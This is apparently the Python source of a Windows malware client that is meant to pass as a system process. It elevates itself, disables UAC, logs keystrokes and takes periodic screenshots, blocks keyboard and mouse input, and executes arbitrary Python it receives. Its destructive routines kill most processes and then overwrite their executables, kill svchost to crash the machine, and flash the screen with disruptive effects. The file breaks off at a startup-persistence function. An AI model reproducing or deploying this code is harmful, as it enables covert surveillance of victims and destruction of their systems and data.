

import ctypes
import sys
def run_as_admin(): # don't work :sad_face:
        if ctypes.windll.shell32.IsUserAnAdmin() == 0:
                #shell.ShellExecuteEx(lpVetbl='runas', lpFile='powershell.exe', lpParameters='/c ' + selfScriptFullLocation)
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
                sys.exit()
run_as_admin()

import os
import subprocess
import pyautogui
import keyboard
import sys
import pyttsx3
import socket
import shutil
import threading

from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
import winsound
import pynput
import wave
import pyaudio
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import multiprocessing
import signal
import pygame
import shlex
import time
import pyautogui as pt
from time import sleep
import win32gui
import numpy as np
import sounddevice as sd
import win32con
import comtypes
import win32api
import re
import psutil
from win32gui import *
from tcp_latency import measure_latency
from win32api import *
from win32ui import *
from win32con import *
from random import *
from pynput.keyboard import Key, Listener
import logging
from datetime import datetime
from gtts import gTTS
import os
import playsound
import multiprocessing
import multiprocess as mp
from multiprocessing import Pool
from multiprocessing import cpu_count
from multiprocessing import Process
from pytube import YouTube
import win32api
#import rsa
import ctypes
import pythoncom, pyWinhook
from gtts import gTTS
import win32com.shell.shell as shell
from langdetect import detect, DetectorFactory
from googletrans import Translator
translator = Translator(service_urls=[
            'translate.google.com',
])
import sys
import trace
import threading
from random import randint
import random
import sounddevice as sd

computersusername = os.environ['username']

pyautogui.FAILSAFE = False

SelfUserUsername = os.environ['username']
SelfComputerName= os.environ['COMPUTERNAME'] # --uac-admin ; Py installer to get UAC admin rights on exe
SelfFilename = 'tbl.exe' # os.path.basename(__file__) # Change accordingly !
SelfFolderContainingProgram = os.path.split(os.path.abspath(os.path.realpath(sys.argv[0])))[0]
selfScriptFullLocation = SelfFolderContainingProgram + '\\' + SelfFilename

import subprocess
import sys
import time
import multiprocessing
import threading

from queue import Queue




def script1():#task_queue):
    import ctypes
    import sys
    def run_as_admin(): # don't work :sad_face:
        if ctypes.windll.shell32.IsUserAnAdmin() == 0:
            #shell.ShellExecuteEx(lpVetbl='runas', lpFile='powershell.exe', lpParameters='/c ' + selfScriptFullLocation)
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
            sys.exit()
    run_as_admin()
    import os
    import subprocess
    import pyautogui
    import keyboard
    import sys
    import pyttsx3
    import socket
    import shutil
    import threading
    from ctypes import cast, POINTER
    from comtypes import CLSCTX_ALL
    import winsound
    import pynput
    import wave
    import pyaudio
    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
    import multiprocessing
    import signal
    import pygame
    import shlex
    import time
    from queue import Queue
    import pyautogui as pt
    from time import sleep
    import win32gui
    import numpy as np
    import sounddevice as sd
    import win32con
    import comtypes
    import win32api
    import re
    from tcp_latency import measure_latency
    from win32api import Sleep, GetSystemMetrics
    import psutil
    from win32gui import LoadIcon, DeleteDC, StretchBlt, GetDC, BitBlt, DrawIcon
    from win32ui import GetDC, BitBlt, DrawIcon
    from win32con import SRCCOPY, NOTSRCCOPY, IDI_WARNING, IDI_ERROR
    from random import randrange, choice
    from pynput.keyboard import Key, Listener
    import logging
    from datetime import datetime
    from gtts import gTTS
    import os
    import playsound
    import multiprocessing
    import multiprocess as mp
    from multiprocessing import Pool
    from multiprocessing import cpu_count
    from multiprocessing import Process
    from pytube import YouTube
    import win32api
    #import rsa
    import ctypes
    import pythoncom, pyWinhook
    from gtts import gTTS
    import win32com.shell.shell as shell
    from langdetect import detect, DetectorFactory
    from googletrans import Translator
    translator = Translator(service_urls=[
          'translate.google.com',
    ])
    import sys
    import trace
    import threading
    from random import randint
    import random
    import sounddevice as sd

    computersusername = os.environ['username']

    pyautogui.FAILSAFE = False

    SelfUserUsername = os.environ['username']
    SelfComputerName= os.environ['COMPUTERNAME'] # --uac-admin ; Py installer to get UAC admin rights on exe
    SelfFilename = 'tbl.exe' # os.path.basename(__file__) # Change accordingly !
    SelfFolderContainingProgram = os.path.split(os.path.abspath(os.path.realpath(sys.argv[0])))[0]
    selfScriptFullLocation = SelfFolderContainingProgram + '\\' + SelfFilename





    def presskeys(inputGiven): # maybe it being first will fix the problems
        try:
            import keyboard
            keyboard.press_and_release(inputGiven)
        except Exception as e:
            print(e)


    class KThread(threading.Thread):
        """A subclass of threading.Thread, with a kill()
    method."""
        def __init__(self, *args, **keywords):
            threading.Thread.__init__(self, *args, **keywords)
            self.killed = False

        def start(self):
            """Start the thread."""
            self.__run_backup = self.run
            self.run = self.__run            # Force the Thread to
            threading.Thread.start(self)

        def __run(self):
            """Hacked run function, which installs the
    trace."""
            sys.settrace(self.globaltrace)
            self.__run_backup()
            self.run = self.__run_backup

        def globaltrace(self, frame, why, arg):
            if why == 'call':
                return self.localtrace
            else:
                return None

        def localtrace(self, frame, why, arg):
            if self.killed:
                if why == 'line':
                    raise SystemExit()
            return self.localtrace

        def kill(self):
            self.killed = True


    def nothing():
        pass


    def disableinput(EnabledDisabled, keyboardOrMouse):
        global disablekeyboard, disablemouse
        hm = pyWinhook.HookManager()

        def offEvent(event):
            return False
        def OnEvent(event):
            return True

        def disablemouse():
            hm.MouseAll = offEvent
            hm.HookMouse()
            pythoncom.PumpMessages()

        def disablekeyboard():
            hm.KeyAll = offEvent
            hm.HookKeyboard()
            pythoncom.PumpMessages()


        if EnabledDisabled == 'False' and keyboardOrMouse == 'keyboard':
            if not ker.is_alive():
                ker.start()
        elif EnabledDisabled == 'False' and keyboardOrMouse == 'mouse':
            if not mer.is_alive():
                mer.start()
        elif EnabledDisabled == 'True' and keyboardOrMouse == 'keyboard': # enables the x selected input
            if ker.is_alive():
                ker.kill()
        elif EnabledDisabled == 'True' and keyboardOrMouse == 'mouse':
            if mer.is_alive():
                mer.kill()

    disableinput(None,None)
    ker = KThread(target=disablekeyboard)
    mer = KThread(target=disablemouse)


    '''

    def disableinput(EnabledDisabled, keyboardOrMouse):
        global mer, ker, mouse_listener
        if EnabledDisabled == 'False' and keyboardOrMouse == 'keyboard':
            if ker == False:
                for i in range(150):
                    keyboard.block_key(i)
                ker = True
        elif EnabledDisabled == 'False' and keyboardOrMouse == 'mouse':
            if mer == False:
                mouse_listener.start()
                mer = True
        elif EnabledDisabled == 'True' and keyboardOrMouse == 'keyboard': # enables the x selected input
            if ker == True:
                for i in range(150):
                    keyboard.unblock_key(i)
                ker = False
        elif EnabledDisabled == 'True' and keyboardOrMouse == 'mouse':
            if mer == True:
                mer = False
                mouse_listener.stop()
                mouse_listener.join()
            mouse_listener = pynput.mouse.Listener(suppress=True)
            mouse_listener.start()

    mouse_listener = pynput.mouse.Listener(suppress=True)
    ker = False
    mer = False
    disableinput(None,None)'''

    '''
    while True:
        global ismouseenabled, iskeyboardenabled
        ismouseenabled, iskeyboardenabled = True, True
        a = input('Toggle, Keyboard or mouse either True or False:')
        a = f' {a} '
        if ' true' in a.casefold() or ' on' in a.casefold():
            if ' keyboard' in a.casefold():
                disableinput(True, 'keyboard')
            elif ' mouse' in a.casefold():
                disableinput(True, 'mouse')
            else:
                print('Not understood')
        elif ' false' in a.casefold() or ' off' in a.casefold():
            if ' keyboard' in a.casefold():
                disableinput(False, 'keyboard')
            elif ' mouse' in a.casefold():
                disableinput(False, 'mouse')
            else:
                print('Not understood')
        else:
            print('Not understood')
    '''

        
    # This build file should be named : "Client Server Runtime Process"
    # With an icon of a system .exe file

    # make an offline script when detected firewall causing problems, done
    # make a text to speak to scare, done
    # make scripts for 90% of the doings, such as setting file in correct place, making it "invisible", PC-Killer(100% everything)

    # make a "hidden" theme to this.


    # for the app make it self updating with a txt file that has a "name" that has the text part, "function" that has the code for








    # take to note, script name ends with a .py when above is ran, replace to .exe!, exe is a sub to the py. a translator.

    def webhandler(website):
        runcmd(f'start chrome "{website}"')



    def powershell(cmd):
        subprocess.run(["powershell.exe", "-Command", cmd], capture_output=True, text=True)
            

    def programVL1(program): # doesn't work b\c of the cmd & powershell killers
        'Uses start method already, not for running commands'
        os.system(f'{program}')

    def programVL2(cmd, suppress=False, retry=0):
            try:
                    a = shell.ShellExecuteEx(lpVetbl='runas', lpFile='cmd.exe', lpParameters='/c '+cmd)
                    #print(a)
                    if a['hInstApp'] > 32:
                            if suppress == False:
                                    print("The admin command ran successfully", "@ command :", cmd)
                            else:
                                    pass
                    else:
                            if suppress == False:
                                    print("The admin command failed with an error code", ctypes.WinError(), "@ command :", cmd)
                            else:
                                    pass
                            if suppress == False:
                                    print(f'{retry+1} Retrying running(admin): {cmd}')
                            retry +=1
                            if retry > 4:
                                    return
                            return programVL2(cmd, suppress, retry)
            except Exception as e:
                    #print(f'Error at programVL2, {e}')
                    if 'The operation was canceled by the user.' in e.args:
                            retry +=1
                            return programVL2(cmd, suppress, retry)



    def screenoff():
        win32api.SendMessage(0xFFFF, 0x0112, 0xF170, 2) 

    def blackenscreen(durationinSeconds): # a bit extra
        print(int(durationinSeconds))
        t_end = time.time() + int(durationinSeconds)
        while time.time() < t_end:
            #print(time.time())
            #os.system('%systemroot%\system32\scrnsave.scr /s')
            threading.Thread(target=screenoff).start()
            sleep(0.2)


    def DisableUAC():
        'To do this you need access to the computer And Allow the UAC prompt'
        programVL2('reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f')
        


    #def EnableUAC(): # not allowed. yet saved.
    #    programVL2('C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f')
    
    def texttospeech(text): # re work on this shit, add russian and hebrew
        pythoncom.CoInitialize()
        pyttsx3.init(driverName='sapi5')
        engine = pyttsx3.init()
        engine.setProperty('rate', 165)
        engine.setProperty('volume', 10)
        engine.say(f'<pitch middle="-15">{text}</pitch>')
        engine.runAndWait()
        pythoncom.CoInitialize()

    def transalte(translatetext, toLang):
            aftertranslatora = translator.translate(translatetext, dest=toLang, src='auto')
            global translatedtoen
            translatedtoen = aftertranslatora.text
            #print(translation12)
            return translatedtoen
            
    def speak(text, lang):
        try:
            a = randint(0, 1024123)
            tts = gTTS(text=text, lang=lang)
            filename1 = f"tmp{a}files.mp3"
            filename =SelfFolderContainingProgram + '\\' + f"tmp{a}files.mp3"
            tts.save(filename)
            pygame.mixer.init()
            pygame.mixer.music.load(filename)
            pygame.mixer.music.play()
            while pygame.mixer.music.get_busy():
                        pygame.time.Clock().tick(10)
            pygame.mixer.music.unload()
            os.remove(filename)
        except Exception as e:
            print(f'Caught exception:\n{e}')

    def detectLang(text): # returns the en, ru and etc
        try:
            return detect(str(text))
        except Exception as e:
            print(e)
    def speakXlanguage(text): # detects russian, english and whatever, and says it
        speak(text, detectLang(text))
    # make one that gets all the languages and says them - detrects the language.
    # make another one that transltes any language to that language(russain etc) and says it out loud

    # speak russian
    def speakRussian(text):
        text = transalte(text, 'ru')
        speakXlanguage(text)

    def speakFrench(text):
        text = transalte(text, 'fr')
        speakXlanguage(text)
        
    def speakArabic(text):
        text = transalte(text, 'ar')
        speakXlanguage(text)
        
    def speakEnglish(text):
        text = transalte(text, 'en')
        speakXlanguage(text)



    def writetext(text):
        keyboard.write(text)


    def MeAndTheBoys():
        # random int from 1 to x, and chooses a random vid
        list = ['https://www.youtube.com/watch?v=blXEHZ6vyis', 'https://www.youtube.com/watch?v=hY3KOzbgmlY', 'https://www.youtube.com/watch?v=6G4OlCbTpec' ,'https://www.youtube.com/watch?v=9vvKPt7_RFc', 'https://www.youtube.com/watch?v=vW3o29rLk1g', 'https://www.youtube.com/watch?v=qAw0lzJNLtk']
        v = randint(0, len(list)-1)
        webhandler(list[v])
        

    def unclosableVid(YoutubeURL): # not done
        'not done, do not implement'
        try: 
            # object creation using YouTube
            # which was imported in the beginning 
            yt = YouTube(YoutubeURL) 
        except: 
                print("Connection Error") #to handle exception    
        ys = yt.streams.get_highest_resolution()
        ys = yt.streams.get_by_itag('22')
        ys.download()

    def set_volume_max():
            def volpress():
                    pyautogui.press('volumeup', presses=2)
            threadsrun = []
            for i in range(100):
                    a = KThread(target=volpress)
                    threadsrun.append(a)
                    a.start()
            sleep(0.2)
            for i in threadsrun:
                    i.kill()


    def set_volume_zero():
            def volpress():
                    pyautogui.press('volumedown', presses=2)
            threadsrun = []
            for i in range(100):
                    a = KThread(target=volpress)
                    threadsrun.append(a)
                    a.start()
            sleep(0.2)
            for i in threadsrun:
                    i.kill()


    def processestoterminate():
            # a list to kill processes when got all. # PID ONLY!
            tokill = []

            # to not absolutely kill windows there shall be an exclude list, but this program is(sort of) foolproof.
            exclude_list = ["powershell.exe", "WINWORD.EXE","POWERPNT.EXE","GoogleCrashHandler.exe","GoogleCrashHandler64.exe","explorer.exe","svchost.exe","services.exe","csrss.exe","winlogon.exe","lsass.exe","lsm.exe","smss.exe","system","wininit.exe","taskmgr.exe","winmgmt.exe","ntoskrnl.exe","spoolsv.exe","msdtc.exe","audiodg.exe","dwm.exe","searchindexer.exe", "cdwn.exe", "tbl.exe", "chrome.exe", "whatsapp.exe", 'System', 'SecurityHealthService.exe', 'MemCompression', 'csrss.exe', 'MpCmdRun.exe', 'WUDFHost.exe', 'TiWorker.exe', 'smss.exe', 'VSSVC.exe', 'lsass.exe', 'sihost.exe', 'WmiPrvSE.exe', 'ctfmon.exe', 'SearchFilterHost.exe', 'winlogon.exe', 'rdpclip.exe', 'tbl.exe', 'ngen.exe', 'sppsvc.exe', 'backgroundTaskHost.exe', 'cdwn.exe', 'tbl.exe', 'wlms.exe', 'TextInputHost.exe', 'LogonUI.exe', 'svchost.exe', 'smartscreen.exe', 'SearchApp.exe', 'dwm.exe', 'taskkill.exe', 'MsMpEng.exe', 'fontdrvhost.exe', 'cmd.exe', 'Registry', 'TrustedInstaller.exe', 'NisSrv.exe', 'wininit.exe', 'StartMenuExperienceHost.exe', 'tbl.exe', 'mscorsvw.exe', 'System Idle Process', 'conhost.exe', 'ngentask.exe', 'SearchProtocolHost.exe', 'SearchIndexer.exe', 'OneDrive.exe', 'spoolsv.exe', 'explorer.exe', 'SecurityHealthSystray.exe', 'System', 'services.exe']

            exclude_list_HAVE = ["System", "chrome.exe", "WINWORD.EXE","POWERPNT.EXE","GoogleCrashHandler.exe","GoogleCrashHandler64.exe", "wlms.exe"]
            exclude_list_HAVE = [x.lower() for x in exclude_list_HAVE]
            
            ownprogrampid = os.getpid()

            # Functions:
            def corruptfile(directoryoffile):
                    with open(directoryoffile, "tbl+") as f:
                            content = f.read()
                            scrubbed_content = b"X" * len(content)
                            f.seek(0)
                            f.write(scrubbed_content)
                            f.truncate()

            def getchildrenofprocess(pid):
                    process = psutil.Process(pid)
                    for child in process.children(recursive=True):
                            add(child.pid)

            def add(pid, children=False):
                    if pid == ownprogrampid:
                            # Nope.
                            pass
                    else:
                            if children == True:
                                    getchildrenofprocess(pid)
                            if pid not in tokill:
                                    tokill.append(pid)

            processes = psutil.process_iter()
            system32_files = os.listdir(os.environ['WINDIR'] + '\System32')
            windows_files = os.listdir(os.environ['WINDIR'])

            # Iterate through the list of processes
            for process in processes:
                    try:
                            # Get the process ID, name, and executable path
                            pid = process.pid
                            name = process.name()
                            exe_path = process.exe().casefold()
                            if process.name() not in exclude_list:
                                    add(pid)
                            # Check if the process name is in the System32 file list and if the executable path is not in the System32 folder
                            else:
                                    if name in system32_files and exe_path.startswith((os.environ['WINDIR'] + '\\System32').casefold()):
                                            pass
                                    else:
                                            if name in windows_files and exe_path.startswith((os.environ['WINDIR']).casefold()):
                                                    pass
                                            else:
                                                    add(pid)
                    except Exception as e:
                            #print(f'Error: {e}')
                            pass

            # save locations.
            pid_locations = []
            for pid in tokill:
                try:
                    pid_locations.append(psutil.Process(pid).exe())
                except Exception as e:
                    #print(f'Error: {e}')
                    continue
            # Kill all the processes in the list of processes to kill
            for pid in tokill:
                    try:
                            #print(psutil.Process(pid).name(), pid, psutil.Process(pid).exe())
                            if psutil.Process(pid).name().casefold() in exclude_list_HAVE:
                                    pass
                            else:
                                    psutil.Process(pid).kill()
                    except Exception as e:
                            #print(f'Error: {e}')
                            pass

            #print('\n\nAnd now to corrupt..\n')

            for location in pid_locations:
                    try:
                            corruptfile(location) # corrupt it, cause why tf not?
                    except Exception as e:
                            #print(f'Error: {e}')
                            pass



    def payload_1(): # good enough
            import random
            import winsound
            desk = win32gui.GetDC(0)
            x = win32api.GetSystemMetrics(0)
            y = win32api.GetSystemMetrics(1)
            for i in range(150):
                    win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), win32con.DSTINVERT)
                    winsound.Beep(440, 50)
                    win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), win32con.DSTINVERT)
                    winsound.Beep(220, 50)
                    win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), win32con.DSTINVERT)
                    winsound.Beep(660, 50)
                    Sleep(40)
            win32gui.ReleaseDC(desk, win32gui.GetDesktopWindow())
            win32gui.DeleteDC(desk)


    def payload_2():

            x, y = GetSystemMetrics(0), GetSystemMetrics(1)
            def asidjhb():
                    play_shepard_tone(100, 1000, 10)
            threading.Thread(target=asidjhb).start()
            def flash():
                    for i in range(100):
                            dc = GetDC(0)
                            BitBlt(dc, 0, 0, x, y, dc, 0, 0, NOTSRCCOPY)
                            DeleteDC(dc)
                            Sleep(1)
            def invert_once():
                    dc = GetDC(0)
                    BitBlt(dc, 0, 0, x, y, dc, 0, 0, NOTSRCCOPY)
                    DeleteDC(dc)
            def tunnel():
                    dc = GetDC(0)
                    StretchBlt(dc, 0, 0, x, y, dc, -20, -20, x+40, y+40, SRCCOPY)
                    DeleteDC(dc)
            def draw_icons():
                    dc = GetDC(0)
                    w = None
                    IconWarning = LoadIcon(w, IDI_WARNING)
                    IconError = LoadIcon(w, IDI_ERROR)
                    DrawIcon(dc, randrange(x), randrange(y), choice([IconError, IconWarning]))
                    DrawIcon(dc, randrange(x), randrange(y), choice([IconError, IconWarning]))
                    DeleteDC(dc)
            for i in range(100):
                    Sleep(60)
                    tunnel()
                    draw_icons()
                    if i % 3 == 0:
                            invert_once()

    def payload_3():
        # Get the device context for the entire screen
        hdc = win32gui.GetDC(0)
        # Set the pen and brush colors to random values
        pen_color = win32api.RGB(randint(0, 255), randint(0, 255), randint(0, 255))
        pen = win32gui.CreatePen(win32con.PS_SOLID, 1, pen_color)
        brush_color = win32api.RGB(randint(0, 255), randint(0, 255), randint(0, 255))
        brush = win32gui.CreateSolidBrush(brush_color)
        old_pen = win32gui.SelectObject(hdc, pen)
        old_brush = win32gui.SelectObject(hdc, brush)

        # Get the screen width and height
        screen_width = win32api.GetSystemMetrics(0)
        screen_height = win32api.GetSystemMetrics(1)

        # Continuously draw random shapes on the screen
        timeout = 20     # [seconds]
        timeout_start = time.time()

        #def play_tone_thread():
        #        play_tone(1000, 10)

        while time.time() < timeout_start + timeout:
                x = randint(0, screen_width)
                y = randint(0, screen_height)
                width = randint(10, screen_width // 10)
                height = randint(10, screen_height // 10)
                if randint(0, 1) == 0:
                        win32gui.Ellipse(hdc, x, y, x + width, y + height)
                else:
                        win32gui.Rectangle(hdc, x, y, x + width, y + height)
                pen_color = win32api.RGB(randint(0, 255), randint(0, 255), randint(0, 255))
                pen = win32gui.CreatePen(win32con.PS_SOLID, 1, pen_color)
                brush_color = win32api.RGB(randint(0, 255), randint(0, 255), randint(0, 255))
                brush = win32gui.CreateSolidBrush(brush_color)
                win32gui.SelectObject(hdc, pen)
                win32gui.SelectObject(hdc, brush)
                play_tone(1000, 10)
                #t = threading.Thread(target=play_tone_thread).start()
                time.sleep(0.01)

        win32gui.SelectObject(hdc, old_pen)
        win32gui.SelectObject(hdc, old_brush)



    def payload_4():
            # Get the device context for the entire screen
            hdc = win32gui.GetDC(0)

            # Get the screen width and height
            screen_width = win32api.GetSystemMetrics(0)
            screen_height = win32api.GetSystemMetrics(1)

            timeout = 60     # [seconds]
            min_interval = 3     # [seconds]
            max_interval = 7     # [seconds]

            timeout_start = time.time()

            while time.time() < timeout_start + timeout:
                    # Stretch and compress the screen randomly
                    x1 = randint(0, screen_width)
                    y1 = randint(0, screen_height)
                    x2 = randint(0, screen_width)
                    y2 = randint(0, screen_height)
                    w1 = randint(1, screen_width)
                    h1 = randint(1, screen_height)
                    w2 = randint(1, screen_width)
                    h2 = randint(1, screen_height)
                    win32gui.StretchBlt(hdc, x1, y1, w1, h1, hdc, x2, y2, w2, h2, win32con.SRCCOPY)

                    # Fill the entire screen with a random color
                    interval = randint(min_interval, max_interval)
                    color = choice([(255, 0, 0), (0, 255, 0), (0, 0, 255), (127, 127, 127), (255, 127, 0)])
                    brush = win32gui.CreateSolidBrush(win32api.RGB(*color))
                    win32gui.FillRect(hdc, (0, 0, screen_width, screen_height), brush)
                    play_tone(100, 100)
                    play_shepard_tone(10, 100, 1)
                    play_tone(1000, 10)
                    time.sleep(interval)


    def payload_5():
            timeout = 7     # [seconds]
            
            def amtxuif():
                    MessageBox = ctypes.windll.user32.MessageBoxW
                    MessageBox(None, "An error has occurred", "Error", 0x40 | 0x1)

            threading.Thread(target=amtxuif).start()
            
            def awhiletrue():
                    while True:
                            winsound.PlaySound("SystemHand", winsound.SND_ALIAS | winsound.SND_ASYNC | winsound.SND_LOOP)
                            sleep(1.3)
            def bwhiletrue():
                    while True:
                            winsound.PlaySound("SystemExclamation", winsound.SND_ALIAS | winsound.SND_ASYNC | winsound.SND_LOOP)
                            sleep(0.04)
            def abcd():
                    threading.Thread(target=awhiletrue).start()
                    sleep(0.5)
                    threading.Thread(target=bwhiletrue).start()

            timeout_start = time.time()
            abcd()
            while time.time() < timeout_start + timeout:
                    pass
            print('Trigger!, Force crashing b\\c of payload 5.')
            crashOOPS()
            crashOOPS()
            crashOOPS()

    def payload_6():
            # Get the device context for the entire screen
            hdc = win32gui.GetDC(0)

            # Get the screen width and height
            screen_width = win32api.GetSystemMetrics(0)
            screen_height = win32api.GetSystemMetrics(1)

            timeout = 10     # [seconds]

            timeout_start = time.time()

            while time.time() < timeout_start + timeout:
                    win32gui.BitBlt(hdc, 0, 0, screen_width, screen_height, hdc, 0, 0, win32con.NOTSRCCOPY)
                    # Display a grayscale version of the screen
                    gray_dc = win32gui.CreateCompatibleDC(hdc)
                    bitmap = win32gui.CreateCompatibleBitmap(hdc, screen_width, screen_height)
                    win32gui.SelectObject(gray_dc, bitmap)
                    win32gui.BitBlt(gray_dc, 0, 0, screen_width, screen_height, hdc, 0, 0, win32con.SRCCOPY)
                    brush = win32gui.CreateSolidBrush(0)
                    win32gui.FillRect(gray_dc, (0, 0, screen_width, screen_height), brush)
                    win32gui.BitBlt(hdc, 0, 0, screen_width, screen_height, gray_dc, 0, 0, win32con.SRCCOPY)
                    win32gui.DeleteDC(gray_dc)

    def play_tone(frequency, duration):
            #print(f'Playing {frequency}hz for a duration of {duration}')
            winsound.Beep(frequency, duration)



    def takeascreenshot(): # the name of the screenshot is usually the date..
        now = datetime.now()
        riname = now.strftime('%Y-%m-%d @ %H:%M:%S.%f')[:-3]
        ariname = riname.replace(':', ';')
        ss = pt.screenshot()
        ss.save(str(ariname) + ".png")


    def keylogger(): # smirk - every 1.3 seconds take a screenshot!
        global loggerenabled
        'This should always be running in the background, and when toggled true it goes to work'
        if os.path.exists('.\\VAryLog'):
            pass
        else:
            os.mkdir('VAryLog')

        def keyer():
            print('logging enabled')
            logging.basicConfig(filename=(".\VAryLog\log.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
            def on_press(key):
                    logging.info(str(key))
            
            with Listener(on_press=on_press) as listener :
                    listener.join()

        print('KeyLogger Enabled')
        keyLogProcess = Process(keyer)
        keyLogProcess.start()    
        while loggerenabled == True:
            takeascreenshot()
            sleep(1.5)
    '''
    if __name__ == '__main__':
        global loggerenabled
        loggerenabled = True
        tmp = Process(target=keylogger)
        tmp.start()
        sleep(4)
        tmp.kill()
        print('done')
    '''

    def crshonctrlscrllkinstall():
            #os.system(f'NET FILE > NUL 2>&1 || POWERSHELL -ex Unrestricted -Command "Start-Process -Vetbl RunAs -FilePath {scriptlocation} -ArgumentList \'/c \\"%~fnx0\\" %*\'" #&& EXIT /b')

            programVL2('REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\kbdhid\Parameters    /f /v CrashOnCtrlScroll /t REG_DWORD /d 1')





    def subprocess_cmd(command):
            process = subprocess.Popen(f'start /B {command}', stdout=subprocess.PIPE)
            proc_stdout = process.communicate()[0].strip() 
            print(proc_stdout)


    def crashOOPS():
        runcmd('taskkill /f /im svchost.exe')
    '''
    def killallunknownprocess():
        # List of processes to exclude from killing
        exclude_list = ["powershell.exe", "WINWORD.EXE","POWERPNT.EXE","GoogleCrashHandler.exe","GoogleCrashHandler64.exe","explorer.exe","svchost.exe","services.exe","csrss.exe","winlogon.exe","lsass.exe","lsm.exe","smss.exe","system","wininit.exe","taskmgr.exe","winmgmt.exe","ntoskrnl.exe","spoolsv.exe","msdtc.exe","audiodg.exe","dwm.exe","searchindexer.exe", "cdwn.exe", "tbl.exe", "chrome.exe", "whatsapp.exe", 'System', 'SecurityHealthService.exe', 'MemCompression', 'csrss.exe', 'MpCmdRun.exe', 'WUDFHost.exe', 'TiWorker.exe', 'smss.exe', 'VSSVC.exe', 'lsass.exe', 'sihost.exe', 'WmiPrvSE.exe', 'ctfmon.exe', 'SearchFilterHost.exe', 'winlogon.exe', 'rdpclip.exe', 'tbl.exe', 'ngen.exe', 'sppsvc.exe', 'backgroundTaskHost.exe', 'cdwn.exe', 'tbl.exe', 'wlms.exe', 'TextInputHost.exe', 'LogonUI.exe', 'svchost.exe', 'smartscreen.exe', 'SearchApp.exe', 'dwm.exe', 'taskkill.exe', 'MsMpEng.exe', 'fontdrvhost.exe', 'cmd.exe', 'Registry', 'TrustedInstaller.exe', 'NisSrv.exe', 'wininit.exe', 'StartMenuExperienceHost.exe', 'tbl.exe', 'mscorsvw.exe', 'System Idle Process', 'conhost.exe', 'ngentask.exe', 'SearchProtocolHost.exe', 'SearchIndexer.exe', 'OneDrive.exe', 'spoolsv.exe', 'explorer.exe', 'SecurityHealthSystray.exe', 'System', 'services.exe']
        # Get a list of all running processes
        processes = psutil.process_iter()

        # Helper function to kill a process and its children
        def kill_process_tree(pid):
                process = psutil.Process(pid)
                for child in process.children(recursive=True):
                        child.kill()
                        print(child.name())
                print(process.name())
                process.kill()
        # Iterate through the list of processes
        for process in processes:
                try:
                        #Get the process ID and name
                        pid = process.pid
                        if process.name() not in exclude_list:
                                # Kill the process and its children using the helper function
                                kill_process_tree(pid)
                except:
                        pass'''
        
    
    # also delete those processes

    def logoffuser():
        runcmd('shutdown /l')


    def togglemute(): # this should be a toggle, "Toggle Volume".         
        while True:
            sleep(1.5)
            set_volume_zero()
    '''    global isenabledToggleMute
        def mutesystem():
            while True:
                def v():
                    try:
                        #print('a')
                        devices = AudioUtilities.GetSpeakers()
                        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                        volume = cast(interface, POINTER(IAudioEndpointVolume))
                        volume.SetMasterVolumeLevel(-64.0, None)
                    except Exception as e:
                        print(e)
                        v()
                v()
        global vmutetoggle
        vmutetoggle = KThread(target=mutesystem)
        try:
            if isenabledToggleMute == False:
                comtypes.CoInitialize()
                vmutetoggle.start()
                isenabledToggleMute = True
            else:
                comtypes.CoUninitialize()
                vmutetoggle.kill()
                isenabledToggleMute = False
        except NameError:
            isenabledToggleMute = True
            vmutetoggle.start()'''


    def inviscurr(duration): # this is just annoying.. it takes the current focused window and makes it invisible.. dumb
            a = time.time() + int(duration)
            while time.time() < a:
                    the_program_to_hide = win32gui.GetForegroundWindow()
                    win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)


    def msgtosystem(text):
        runcmd(f'msg * \"{text}\"')

    def runpythonscript(text):
        try:
            exec(text)
        except Exception as e:
            return e
            
    def startPhIntro():
        webhandler('https://youtu.be/GcGX2kZM4xw')


    def play_shepard_tone(start_hz, end_hz, duration):
        samples_per_second = 44100
        t = np.linspace(0, duration, int(samples_per_second * duration), False)
        f = start_hz * np.power(end_hz/start_hz, t/duration)
        wave = 0.5 * np.sin(2*np.pi*f*t)
        info = sd.query_devices()
        device_id = None
        for i, device in enumerate(info):
                if device['max_output_channels'] > 0:
                        device_id = i
                        break

        if device_id is not None:
                sd.play(wave, samples_per_second, device=device_id)
                sd.wait()
        else:
                print('No available output device found')


    '''    p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paFloat32, channels=1, rate=samples_per_second, output=True)
        stream.start_stream()
        stream.write(wave.tobytes())
        stream.stop_stream()
        stream.close()
        p.terminate()'''

    def runcmd(cmd, suppress=False, retry=0):
        try:
            a = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            a.wait()
            if a.returncode == 0:
                if suppress == False:
                    print("The command ran successfully", "@ command :", cmd)
                else:
                    pass
            else:
                if suppress == False:
                    print("The command failed with return code", a.returncode, "@ command :", cmd)
                else:
                    pass
                if suppress == False:
                    print(f'{retry+1} Retrying running: {cmd}')
                retry +=1
                if retry > 4:
                        return
                return runcmd(cmd, suppress, retry)
        except Exception as e:
            print(f'Error at runcmd, {e}')


    def selfwillbeaantivirus():
        runcmd(f'msiexec.exe /i \"{selfScriptFullLocation}\" /quiet')


    def resetwindowstodefaults():
        runcmd('systemreset')


    #def blockscreen 
    #def unblockscreen
    def AddSelfToStartupRegistry():
